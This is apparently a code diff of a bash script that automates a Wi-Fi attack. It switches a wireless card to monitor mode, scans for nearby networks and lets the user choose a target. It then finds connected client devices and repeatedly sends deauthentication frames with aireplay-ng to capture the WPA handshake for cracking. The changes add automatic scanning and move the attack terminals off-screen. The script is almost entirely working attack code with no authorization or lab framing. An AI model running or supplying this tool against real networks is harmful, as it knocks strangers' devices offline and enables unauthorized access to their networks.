@@ -1,31 +1,75 @@
 #!/bin/bash
+sudo apt update
+sudo apt install aircrack-ng -y
+sudo airmon-ng check kill
+
+
+# Check if wlan0 is available
+if iw dev wlan0 info &> /dev/null; then
+    if iwconfig wlan0 | grep -q "Mode:Monitor"; then
+        :
+    else
+        sudo airmon-ng start wlan0
+    fi
+fi
+
+
 
 UN=$SUDO_USER
+current_date=$(date +"%d_%m_%y")
 path="/home/$UN/Desktop/wifi_Targets"
+scan_input="$path/Scan/Scan-$current_date.csv"
 mkdir -p "$path"
+mkdir -p "$path/Scan"
 sudo chown -R $UN:$UN $path
 
-read -p "Paste the line (BSSID, Channel, Name):" input_string
-echo
 
-# Extracting values from airodump-ng scan by pasting one row manually:
-bssid_name=$(echo "$input_string" | awk '{for (i=1; i<=NF; i++) if ($i == "PSK" || $i == "SAE" || $i == "OPN" || $i == "MGT") { for (j=i+1; j<=NF; j++) printf "%s%s", $j, (j==NF ? "\n" : " "); break } }')
-bssid_address=$(echo "$input_string" | awk '{print $1}')
-encryption=$(echo "$input_string" | awk '{print $8}')
-channel=$(echo "$input_string" | awk '{print $6}')
+
+# Scan 10 seconds for wifi networks
+sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng wlan0mon --output-format csv -w $path/Scan/Scan-$current_date
+
+countdown_duration=10
+echo -e "\e[1;34mScanning for available WiFi Networks ($countdown_duration s):\e[0m"
+
+for (( i=$countdown_duration; i>=0; i-- )); do
+    tput cuu1 && tput el
+    echo -e "\e[1;34mScanning for available WiFi Networks ($i s):\e[0m"
+    sleep 1
+done
+
+
+mv $path/Scan/Scan-$current_date-01.csv $scan_input
+cp "$scan_input" "$scan_input.original"
+
+
+# Edit original scan file to more orgenized one:
+awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
+awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
+awk '$4 == "" {$4 = "*Hidden*"} 1' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"   
+tail -n +3 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
+head -n -2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"   
+
 
 clear
+echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
 
-# FIX IT!! chinease/spaces/Special characters!!!!!!!!
-# Remove "/" from bssid name
-if [[ $bssid_name == *"/"* ]]; then
-    bssid_name=${bssid_name//\//}  # Remove "/"
-fi
 
-if [[ $input_string == *"<length:  0>"* ]]; then
-    echo -e "\033[1m\nNot a valid network.\033[0m\n"
-    exit 1
-fi
+# Display the scan input file contents with row numbers
+printf "    Name: %-22s Encryption: %-4s BSSID: %-5s\n" 
+echo
+nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-28s %-16s %-5s\n", $1, $5, $4, $2}'
+echo
+
+# Prompt the user to choose a row number
+read -p "Enter row number: " row_number
+echo
+chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
+bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
+channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
+encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
+bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')
+
+
 
 # Echo values
 echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
@@ -57,9 +101,9 @@ mkdir $path/"$bssid_name"
 
 
 
-# Scan 30 seconds for devices:
-gnome-terminal --geometry=100x20+250+120 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
-sleep 4
+# Scan 10 seconds if network on:
+gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
+sleep 10
 
 # Check if the network exists
 if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; then
@@ -69,7 +113,7 @@ if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2
     exit 1
 fi
 
-
+# Scan for devices for 1 minute
 for ((i=1; i<=10; i++)); do
     target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
 
@@ -79,7 +123,7 @@ for ((i=1; i<=10; i++)); do
         break
     fi
     echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
-    sleep 3
+    sleep 6
 done
 
 
@@ -90,12 +134,9 @@ if [ -z "$target_devices" ]; then
     exit 1
 fi
 
-
-
 sleep 3
 
-
-# Check if we capture the handshake:
+# Check if we capture the handshake - Before the attack:
 if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
     echo -e "\033[1;32m->> Got the handshake!\033[0m"
     sudo pkill aireplay-ng
@@ -113,7 +154,7 @@ else
         target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
         
         for target_device in $target_devices; do
-            gnome-terminal --geometry=100x20-250+120 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon &
+            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon
         done
         
         echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
@@ -165,5 +206,7 @@ fi
 
 
 
-#sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager
 
+# Disable monitor mode
+gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop wlan0mon
+gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
